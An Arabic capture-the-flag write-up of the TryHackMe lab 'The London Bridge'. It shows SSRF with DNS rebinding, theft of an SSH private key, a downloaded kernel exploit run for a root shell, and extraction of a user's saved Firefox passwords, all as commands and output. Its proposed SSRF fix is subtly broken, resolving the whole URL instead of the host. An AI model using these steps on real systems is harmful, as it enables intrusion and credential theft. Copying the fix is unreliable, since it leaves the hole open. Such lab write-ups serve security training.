---
title: حل تحدي The London Bridge
date: 2025-04-9
categories: 'CTFs'
tags: ["SSRF","THM"]
description: سقط جسر لندن... أحسن
image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718657342624
---

# المقدمة
بسم الله الرحمن الرحيم، هذا التحدي من [tryhackme](https://tryhackme.com) راح نبدأ بفحص المداخل بعدين راح نشيك على مدونة موجودة على مدخل 8080، راح نستعمل أحد أرهب أساليب استغلال ثغرة SSRF في هذا التحدي. بعدها راح ندخل على السيرفر من ssh باستخدام مفتاح خاص لأحد المستخدمين.

# مدونة 8080
إذا فحصنا المداخل راح نحصل مدخلين مفتوحة (8080،22) إذا رحت للمدونة على مدخل 8080 راح تطلع لك هذي الصفحة
![main_page](/assets/img/london_8080page.png) 
إذا قعدنا نفحص الموقع ونمر على الصفحات راح نعدي على المجلة، يمدينا فيها نرفع صورة للموقع

![gallery](/assets/img/london_gallery.png)
إذا قرأت السورس كود راح تلاحظ تعليق مكتوب يقول 
"To devs: Make sure that people can also add images using links"
هذا يخليك تطرح تساؤل عن خاصية رفع الصور من خلال الروابط، هل هي موجودة الآن؟، كيف أقدر أرفع صور بهذه الطريقة؟، هل يوجد صفحة مخصصة لهذه الخاصية ولا في نفس هذي الصفحة؟. خلينا نمسك الأسئلة على حدة، نبدأ بالبحث عن الصفحات الغير موجودة في الواجهة باستخدام ffuf
```bash
ffuf -u http://10.10.19.191:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt 

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.19.191:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

contact                 [Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 174ms]
upload                  [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 138ms]
gallery                 [Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 128ms]
feedback                [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 129ms]
view_image              [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 118ms] ::
```
عندنا صفحة بعنوان view_image لكن تعطيني كود غريب 405، إذا بحثت في قوقل راح تعرف أن هذا الكود method not allowed أو أن صيغة الطلب خاطئة، خلينا نستعمل curl عشان ناخذ راحتنا:
```bash
$ curl http://10.10.147.141:8080/view_image -I
HTTP/1.1 405 METHOD NOT ALLOWED
Server: gunicorn
Date: Wed, 09 Apr 2025 20:08:58 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 178

$ curl http://10.10.147.141:8080/view_image -X POST
<!DOCTYPE html>
<html lang="en">
...
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
</body>
</html>
```
بعد ما غيرنا صيغة الطلب قدرنا نشوف محتوى الصفحة، هذي صفحة بسيطة ترسل لها رابط وتطلع لك الصورة، خليني أجرب أرسل رابط:
```bash
$ curl http://10.10.147.141:8080/view_image -X POST -d "image_url=https://www.almazarat.com/blog/Holy-Kaaba"
...
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="https://www.almazarat.com/blog/Holy-Kaaba" alt="User provided image">
</body>
</html>
```
يا سلام. الآن جاوبنا على سؤالين، السؤال الأول كان " هل هذه الخاصية -رفع صور عبر الرابط- موجودة الآن؟- والإجابة نعم. السؤال الثاني "هل يوجد صفحة مخصصة لهذه الخاصية؟" والجواب نعم. السؤال الثالث كان عن طريقة رفع الصور وأعتقد أنه واضح. خليني أسأل سؤال... إيش المتغيرات اللي أنا أتحكم فيها؟. هذا السؤال تعلمته من [هذا التحدي](https://tryhackme.com/room/cryptofailures). السؤال أعجبني جدا. في هذه الحالة المتغير اللي أقدر أتحكم فيه هو الرابط حق الصورة، وأنا أعرف من خبرتي البسيطة أن فيه نوع من الثغرات يكون متواجد في حالة كان المستخدم يرسل روابط للسيرفر، هذه الثغرة هي SSRF خليني أجرب أرسل رابط ل localhost
```bash
$ curl http://10.10.212.25:8080/view_image -X POST -d "image_url=http://localhost:8080/gallery"
...
    </form>
    <img src="http://localhost:8080/gallery" alt="User provided image">
</body>
</html>
```
أنا رسلت طلب وأعطيت السيرفر رابط localhost واللي يعني السيرفر المحلي، يعني المفروض إذا كان فيه ثغرة راح يعطيني محتوى صفحة gallery لكن تلاحظ أن السيرفر حط الرابط على إنه السورس حق الصورة، خلينا نشوف إذا عندنا parameters ثانية:
```bash
$ ffuf -u http://10.10.212.25:8080/view_image -d "FUZZ=http://localhost" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -t 20 -H "Content-Type: application/x-www-form-urlencoded" -fs 823

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.212.25:8080/view_image
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=http://localhost
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 823
________________________________________________

:: Progress: [6453/6453] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```
الواضح أن ماعندنا parameters تنفع من هذا الملف، خليني أجرب ملف ثاني:
```bash
$ ffuf -u http://10.10.212.25:8080/view_image -d "FUZZ=http://localhost" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt  -t 20 -H "Content-Type: application/x-www-form-urlencoded" -fs 823

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.212.25:8080/view_image
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=http://localhost
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 823
________________________________________________

www                     [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 125ms]
```
أنا كل ما اخترقت أشياء أكثر كل ماوقعت في حب الكود هذا 403، خليني أرسل طلب باستخدام curl وأشوف رد السيرفر:
```bash
$ curl http://10.10.212.25:8080/view_image -d "www=http://localhost:8080/gallery"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```
طيب، الطلب وصل للسيرفر لكن ماعندي صلاحيات، الواضح أن السيرفر يشيك على الدومين اللي أرسله، وإذا كان يشير إلى اللوكال هوست راح يرفضه. فيه تكتيك اسمه dns rebinding خليني استطرد فيه عشان آخذ راحتي في الشرح

#### خلينا نحلل شوية
dns rebinding يعتبر تكنيك لتخطي الحماية وأنا شخصيا لاأعتقد أنه هجمة الكترونية -بعكس SQLi- في بعض الحالات السيرفر يمنع نفسه من ارسال الطلبات إلى جهات مجهولة، تخيل أنك اكتشفت ثغرة XSS وتبغا تخلي السيرفر يستدعي ملف جافاسكربت من السيرفر حقك، في كثير من الأحيان السيرفر ماراح يرسل لك طلب، والسبب هو Same Origin Policy (SOP) واللي تحد السيرفر على جهات محددة يعينها المبرمج.
في السيرفر اللي قاعدين نتعامل معاه ذحين أعتقد أن المطور قاعد يستخدم سكربت عشان يفحص الطلبات اللي تجيه، إذا كان الطلب يشير إلى localhost أحظره، عشان كذا قاعدين نشوف هذه الرسالة اللي تقول أن ماعندي صلاحيات أقرأ محتويات هذه الصفحة.
#### dns rebinding
فكرة هذا التكنيك بشكل سطحي هي تغيير الدومين بشكل سريع جدا بحيث الfront end للسيرفر يشوف دومين غير محظور مثل google.com لكن في أثناء ما الطلب قاعد يتوجه على ال backend راح يتغير الدومين إلى localhost وبهذه الطريقة نقدر نتخطى الحماية الموجودة (في حال كانت في الواجهة فقط!) روح [هذا الموقع](https://lock.cmpxchg8b.com/rebinder.html) وحط في الخانة الأولى دومين وفي الثانية دومين مختلف وبعدين انسخ الرابط الموجود وجرب عليه هذا الأمر:
![rebind](/assets/img/london_rbndr.png)
```bash
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 127.0.0.1
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 127.0.0.1
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 127.0.0.1
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 8.8.8.8
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 127.0.0.1
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 127.0.0.1
$ host 08080808.7f000001.rbndr.us
08080808.7f000001.rbndr.us has address 8.8.8.8
```
نلاحظ أن بعض الأحيان يجينا الآيبي حق قوقل وبعد الأحيان حق اللوب باك، هذي هي فكرة هذا التكنيك، ذحين خلينا نجربه على سيرفر التحدي

## تخطي الحماية
في الموقع اللي قبل شوي خلينا نجرب في الخانة الأولى نحط 127.0.0.1 وفي الثانية 0.0.0.0 والرابط راح يكون 00000000.7f000001.rbndr.us خلينا نرسل طلب لسيرفر التحدي ونشوف النتيجة
```bash
curl http://10.10.212.25:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:8080/gallery"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>London Gallery</title>
    ...
```
ياسلام، تخطينا الحماية السطحية. خليني أنبه على أن الحماية في السيرفرات الواقعية راح تكون أكبر من كذا بكثير، يعني لازم تستغل ثغرة subdomain takeover لدومين تملكه الشركة، بعدين تسوي التكنيك هذا، تلاحظ إننا في الخانة الأولى حطينا أحد عناوين السيرفر المحلي (0.0.0.0) وفي الخانة الثانية حطينا أيضا أحد عناوين السيرفر المحلي (127.0.0.1) والسبب هو أن السيرفر يشيك على اسم الدومين فقط لكن ما يسوي resolve للدومين.

# استغلال الثغرة والوصول للسيرفر
خلينا نبدأ نبحث عن ملفات:
```bash
$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:8080/etc/passwd" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:8080/../../../../etc/passwd"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:8080/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
غريبة، مايمدينا نوصل لأحد ملفات النظام etc/passwd/ خلينا نبحث عن المداخل الموجودة باستخدام ffuf:
```bash
$ seq 65535 > ports

$ head ports 
1
2
3
4
5
6
7
8
9
10

$ ffuf -u http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:FUZZ/../../../etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -w ports -fs 290

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.32.94:8080/view_image
 :: Wordlist         : FUZZ: /home/vulner/thm/londonbridge/ports
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://00000000.7f000001.rbndr.us:FUZZ/../../../etc/passwd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 290
________________________________________________

80                      [Status: 200, Size: 469, Words: 96, Lines: 15, Duration: 334ms]
``` 
الواضح أن عندنا خدمة على مدخل 80 غير متاحة إلا بشكل محلي، عشان كذا يوم فحصنا المداخل ما طلعت معنا في النتائج. قبل ما نبحث عن ملفات خلينا نشوف رد السيرفر على طلب ffuf:
```bash
$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:80/../../../etc/passwd" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```
خلينا نستخدم ffuf ونبحث عن ملفات في النظام:
```bash
ffuf -u http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:80/FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Discovery/Web-Content/big.txt -fs 469

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.32.94:8080/view_image
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://00000000.7f000001.rbndr.us:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 469
________________________________________________

.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 268ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 306ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 331ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 362ms]
```
ملاحظة بسيطة، التحدي هذا بيعلمك حاجة مهمة، وهي إنك تجرب أكثر من قائمة في نفس المكان، لو تلاحظ القائمة اللي استخدمتها هنا مختلفة عن اللي قبلها. نشوف عندنا مجلد بعنوان .ssh خلينا نرسل طلب لملف id_rsa ونشوف إذا كان موجود داخل هذا المجلد
```bash
$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:80/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
...
```
ملف id_rsa يحتوي المفتاح الخاص بالمستخدم عشان يتصل بخدمة ssh. عندنا مشكلة بسيطة وهي أن اسم المستخدم غير موجود في هذا الملف. يمديك تستخدم ffuf عشان تبحث عن ملفات ثانية في نفس المجلد وراح يطلع لك authorized_keys وفيه اسم المستخدم:
```bash
$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:80/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```
عندنا اسم المستخدم والمفتاح، خلينا ننسخ المفتاح وندخل على السيرفر
```bash
$ curl http://10.10.32.94:8080/view_image -d "www=http://00000000.7f000001.rbndr.us:80/.ssh/id_rsa" > id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa beth@<TARGET_IP>
```
##  الدخول للسيرفر و تصعيد الصلاحيات
بعد ماندخل السيرفر يمدينا نطلع العلم بأكثر من طريقة، أنا أفضل الطريقة الثانية عشان تشوف محتوى الملفات، ممكن فيه شي مثير غير العلم
```bash
beth@london:~$ find / -type f -name 'user.txt' 2>/dev/null
/home/beth/__pycache__/user.txt

beth@london:~$ ls -al --recursive ./*
...
./__pycache__:
total 20
-rw-r--r--  1 root root   25 Apr 23  2024 user.txt
...
```
الآن لازم نصعد الصلاحيات، خلينا نشيك على الأساسيات (SUID, capabilities)
```bash
beth@london:~$ find / -perm -4000 -ls 2>/dev/null
   274769     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   262232     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   262214     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   262205     44 -rwsr-xr-x   1 root     root        43088 Mar  5  2020 /bin/mount
   262249     28 -rwsr-xr-x   1 root     root        26696 Mar  5  2020 /bin/umount
   393484     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
   393413     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
   417493     12 -rwsr-xr-x   1 root     root        10312 Sep 19  2022 /usr/bin/vmware-user-suid-wrapper
   409163     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   421383     40 -rwsr-xr-x   1 root     root        37136 Nov 29  2022 /usr/bin/newuidmap
   427013    148 -rwsr-xr-x   1 root     root       149080 Apr  4  2023 /usr/bin/sudo
   421382     40 -rwsr-xr-x   1 root     root        37136 Nov 29  2022 /usr/bin/newgidmap
   393473     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
   393348     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   393350     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
   417510    428 -rwsr-xr-x   1 root     root       436552 Mar 30  2022 /usr/lib/openssh/ssh-keysign
   393675     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   393685     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   397231      4 drwsrwxrwx   2 root     root           4096 May  7  2024 /usr/share/dbus-1/system-services

beth@london:~$ getcap -r /* 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
```
ماعندنا أي شي مثير، خلينا نشوف إصدار sudo & kernel:
```bash
beth@london:~$ sudo --version
Sudo version 1.8.21p2 # Not Expolitable!!
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

beth@london:~$ uname -a
Linux london 4.15.0-112-generic # This is the kernel version, let's  check for exploits
```
يوم نبحث عن [kernel version 4.15.0-112 privilege escalation](https://www.google.com/search?client=firefox-b-d&q=kernel+version+4.15.0-112+privilege+escalation) راح تطلع لنا طريقتين، [polkit](https://www.exploit-db.com/exploits/47167) & [Race Condition](https://github.com/zerozenxlabs/ZDI-24-020/tree/main) polkit غير موجودة عندنا في السيرفر، راح نستخدم طريقة. في الجهاز حقي race condition
```bash
$ git clone https://github.com/zerozenxlabs/ZDI-24-020.git

$ cd ZDI-24-020/

$ python -m http.server 8081
```
في سيرفر التحدي:
```bash
beth@london:/~ cd /tmp
beth@london:/tmp mkdir exploit ; cd exploit
beth@london:/tmp/exploit$ wget http://10.21.157.83:8081/exploit.c
--2025-04-13 05:39:14--  http://10.21.157.83:8081/exploit.c
Connecting to 10.21.157.83:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36482 (36K) [text/plain]
Saving to: ‘exploit.c’

exploit.c               100%[============================>]  35.63K  44.6KB/s    in 0.8s    

2025-04-13 05:39:16 (44.6 KB/s) - ‘exploit.c’ saved [36482/36482]

beth@london:/tmp/exploit$ wget http://10.21.157.83:8081/Makefile
--2025-04-13 05:39:21--  http://10.21.157.83:8081/Makefile
Connecting to 10.21.157.83:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70 [application/octet-stream]
Saving to: ‘Makefile’

Makefile                100%[============================>]      70  --.-KB/s    in 0s      

2025-04-13 05:39:22 (256 KB/s) - ‘Makefile’ saved [70/70]

beth@london:/tmp/exploit$ wget http://10.21.157.83:8081/symbols/ -r -nH
--2025-04-13 05:40:40--  http://10.21.157.83:8081/symbols
Connecting to 10.21.157.83:8081... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: /symbols/ [following]
--2025-04-13 05:40:41--  http://10.21.157.83:8081/symbols/
Reusing existing connection to 10.21.157.83:8081.
HTTP request sent, awaiting response... No data received.
Retrying.
...

beth@london:/tmp/exploit$ gcc exploit.c -o exploit -lpthread

beth@london:/tmp/exploit$ ./exploit  ubuntu
[+] Attempt 1/10
[+] Found kernel '4.15.0-112-generic' [run_cmd]
[+] Found kernel .text, 0xffffffffb9c00000
[!] need at least 3 cores ideally, found 2
[i] UAF seems to have missed :(
[i] Payload failed to run
[+] Attempt 2/10
[+] Found kernel '4.15.0-112-generic' [run_cmd]
[+] Found kernel .text, 0xffffffffb9c00000
[!] need at least 3 cores ideally, found 2
[+] UAF seems to have hit
[+] Payload ran correctly, spawning shell
uid=0(root) gid=0(root) groups=0(root),1000(beth)
bash-4.4# whoami
root
```
بعد ما حملت الملفات من جهازي ، بنيت السكربت وشغلته وحددت الديسترو، في هذه الحالة ubuntu  وبكذا صرت الروت، بعد ما أخذ العلم من المجلد الخاص بالروت راح يبقالي شي أخير وهو كلمة السر الخاصة بالمستخدم charles، بما إننا الروت نقدر ندخل للمجلد حقه ونشوف إيش عنده
```bash
bash-4.4# cd /home/charles
bash-4.4# ls -al
total 24
drw------- 3 charles charles 4096 Apr 23  2024 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla # very interesting
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```
عندنا مجلد mozilla. وهذا الشي غير عادي أبدا في تحديات الCTF خلينا نشوف إذا يمدينا نحصل شي من خلال قوقل. لقينا [هذا المقال](https://support.mozilla.org/ar/kb/profiles-where-firefox-stores-user-data) من موزيلا والواضح أن هذا المجلد يحوي معلومات المستخدم (كلمات المرور، كوكيز، سجل التصفح... إلخ). ممتاز جدا، خلينا نشوف إذا فيه سكربت يستخرج لنا كلمات المرور من هذا المجلد. بعد البحث حصلت هذه الأداة باسم [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) ماراح أبني الثنائية من السورس، بحمل الثنائية الجاهزة لكن قبلها خليني أنقل المجلد عندي، في سيرفر التحدي راح أفتح سيرفر بايثون
```bash
#CTF server
bash-4.4# cd /home/charles/.mozilla

bash-4.4# python3 -m http.server 8081

#My server
$ wget http://<TARGET_IP>:8081/firefox/ -r -nH

$ ./hack-browser-data -p firefox/8k3bf3zp.charles -b firefox -f json
level=WARN source=browser.go:98 msg="find browser success" browser=firefox-8k3bf3zp.charles
level=WARN source=browserdata.go:56 msg="export success" filename=firefox_8k3bf3zp_charles_cookie.json
level=WARN source=browserdata.go:56 msg="export success" filename=firefox_8k3bf3zp_charles_password.json
level=WARN source=browserdata.go:56 msg="export success" filename=firefox_8k3bf3zp_charles_bookmark.json
level=WARN source=browserdata.go:56 msg="export success" filename=firefox_8k3bf3zp_charles_history.json

$ cat results/firefox_8k3bf3zp_charles_password.json
[
  {
    "UserName": "Charles",
    "Password": "REDACTED",
    "LoginURL": "",
    "CreateDate": "2024-03-16T13:40:58+03:00"
  }
]
```
## الفريق الأزرق، إقفال الثغرة
خلينا نشيك على السورس كود ونشوف كيف السيرفر يتعامل مع روابط الصور- للتذكير، دخلنا على السيرفر من خلال ثغرة SSRF من خلال خاصية رفع الصور باستخدام الروابط- في السيرفر راح أفتح ملف app.py:
```python
...
def is_local(url):
    # Check if the URL is localhost or 127.0.0.1
    if 'localhost' in url or '127.0.0.1' in url or '0.0.0.0' in url:
        return True
    return False

    app = Flask(__name__)
    UPLOAD_FOLDER = 'uploads'
    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
...
def view_image():
    image_url = request.form.get('image_url', '')
    url = request.form.get('www', '')
    if is_local(url):
        abort(403)  # Return a forbidden error if the URL contains localhost or 127.0.0.1
    
    if url:
        return requests.get(url).text
    return render_template('view.html', image_url=image_url)
...
```
طريقة التحقق من الرابط سطحية نوعا ما، السكربت قاعد يشوف "النص"ب حق الرابط لكن مو قاعد يتحقق من عنوان IP حق الدومين اللي في الرابط، اللي أبغى أسويه هو إني آخذ الدومين بعدين أعطيه ل DNS Server وأشوف الآي بي اللي طلع لي، إذا كان يوجه على السيرفر المحلي localhost راح أحظر الطلب:

```python
import socket
def is_local(url):
    # Check if the URL is localhost or 127.0.0.1
    try:
        domain = url.split('://')[1]
        resolved_ip = socket.gethostbyname(url)
        if '127.0.0.1' in resolved_ip or '0.0.0.0' in resolved_ip:
            return True
    except socket.gaierror:
        return True
    return False
```
عدلنا على الدالة حبتين، أول شي راح ناخد الدومين بدون السكيم (http/s) بعدين راح نسوي resolve للدومين، إذا كان يحول على السيرفر المحلي راح نحظره، إذا جاء خطأ برضو راح نحظر الطلب. ممكن يطلع خطأ إذا كان الرابط بدون سكيم (http/s). غالبا فيه طريقة تتخطى التحقق هذا، لكن في الوقت الحالي هذا يكفي:
```bash
$ curl http://10.10.38.70:8080/view_image -d "www=http://127.1:8080" -X POST
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>

$ curl http://10.10.38.70:8080/view_image -d "www=7f000001.00000000.rbndr.us:8080" -X POST
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

$ curl http://10.10.38.70:8080/view_image -d "www=http://7f000001.00000000.rbndr.us:8080" -X POST
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>

$ curl http://10.10.38.70:8080/view_image -d "www=http://7f000001.00000000.rbndr.us:8080" -X POST -H 'Content-Type: application/x-www-form-urlencoded'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

## الخاتمة
في حال وجود خطأ في المقال أو إذا كان فيه طرق ثانية لحل التحدي كلمني على [Twitter](https://x.com/VulnerK0)

## المصادر
- Practice: [Portswigger](https://portswigger.net/web-security/ssrf)
- Learn more: [Owasp Top10](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- Prevention: [Owasp Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)